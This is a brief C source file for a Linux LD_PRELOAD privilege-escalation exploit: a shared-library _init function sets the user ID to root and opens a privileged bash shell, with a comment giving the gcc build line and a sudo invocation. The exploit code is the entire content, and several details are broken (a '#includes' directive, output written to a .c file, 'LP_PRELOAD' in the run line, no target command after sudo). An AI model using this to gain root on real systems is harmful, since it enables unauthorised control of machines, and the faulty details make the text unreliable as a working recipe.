#include <stdio.h>
#include <sys/types.h>
#includes <stdlib.h>
void _init ()
{
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}

/* 
Complie 
gcc -fPIC -shared -nostartfiles -o /tmp/preload.c ld_preload.c

Run with sudo
sudo LP_PRELOAD=/tmp/preload.c 
*/
